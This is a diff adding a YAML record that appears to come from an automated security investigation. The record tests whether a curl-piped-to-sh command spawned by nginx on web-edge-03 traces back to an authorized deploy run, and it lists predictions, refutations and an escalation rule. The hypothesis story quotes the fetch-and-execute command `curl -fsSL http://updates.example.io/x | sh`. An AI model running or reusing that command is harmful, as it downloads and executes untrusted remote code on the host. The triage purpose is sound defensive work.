@@ -1,0 +1,67 @@
+status: complete
+predict:
+  loop: 1
+  shape: A
+
+  hypotheses:
+    - id: h-001
+      name: "?deploy-hook-execution"
+      attached_to_vertex: v-002
+      proposed_edge:
+        relation: spawned
+        parent_vertex: {type: deploy_run, classification: deploy-or-maintenance-run-on-web-edge-03}
+      story: |
+        An authorized deploy or maintenance routine targeting web-edge-03
+        executes post-deploy hook scripts under the www-data identity. The
+        routine invokes `sh -c "curl -fsSL http://updates.example.io/x | sh"`
+        as part of a scripted update step, using nginx's process context as
+        the execution vehicle for hooks that run under the web server's user.
+        The deploy-runs log should record an active run targeting web-edge-03
+        whose execution window contains T=03:11:07Z and whose hook or script
+        manifest references updates.example.io as a fetch target. The nginx
+        pid 1422 parent chain should include a deploy or maintenance tool
+        ancestor above the normal init-level nginx startup ancestry.
+      predictions:
+        - id: p1
+          subject: proposed_edge
+          claim: "deploy-runs records a run targeting web-edge-03 whose execution window contains the shell-spawn timestamp"
+          from_story_link: "an authorized deploy or maintenance routine targeting web-edge-03 executes post-deploy hook scripts"
+        - id: p2
+          subject: proposed_edge
+          claim: "the matching run's script or hook manifest references updates.example.io as a fetch target"
+          from_story_link: "the routine invokes the observed curl command to updates.example.io as part of a scripted update step"
+      attribute_predictions:
+        - id: ap1
+          target: proposed_parent
+          attribute: parent_pname_chain
+          claim: "nginx pid 1422's ancestry includes a deploy or maintenance tool ancestor above the normal init-level nginx startup chain"
+      refutation_shape:
+        - id: r1
+          refutes_predictions: [p1]
+          claim: "no deploy run's execution window contains the shell-spawn timestamp"
+        - id: r2
+          refutes_predictions: [p2]
+          claim: "a matching run exists but its script or hook manifest does not reference updates.example.io as a fetch target"
+        - id: r3
+          refutes_predictions: [ap1]
+          claim: "nginx pid 1422's ancestry matches the baseline init-level nginx startup chain with no deploy or maintenance tool ancestor"
+      authorization_contract:
+        - id: ac1
+          edge_ref: proposed
+          anchor_kind: deploy-runs-correlation
+          predicate: "an active deploy or maintenance run targeting web-edge-03 with an execution window containing the shell-spawn timestamp and a script or hook manifest referencing updates.example.io as a fetch target"
+          on_unauthorized: escalate
+          on_indeterminate: escalate
+      integrity_waived: "deploy-runs records the initiator of the run (developer, CI trigger, or scheduled job); confirming the run authorizes the shell spawn and identifies the responsible actor in one resolution."
+      weight: null
+
+  routing:
+    selected_lead: deploy-runs-correlation
+    composite_secondary: [process-lineage]
+    override_data_source: null
+    lead_hints:
+      deploy-runs-correlation: "Check for any deploy or maintenance run targeting web-edge-03 (agent 082 / 10.0.7.18) with an execution window covering 2026-04-26T03:11:07Z. Verify whether the run's script or hook manifest references updates.example.io."
+      process-lineage: "Reconstruct the parent chain of nginx pid 1422 on web-edge-03 at T=03:11:07Z. Focus on whether any ancestor above nginx is a deploy or maintenance tool rather than the standard init/systemd nginx startup path."
+    scope_override:
+      window_hours: 2
+      anchor: alert
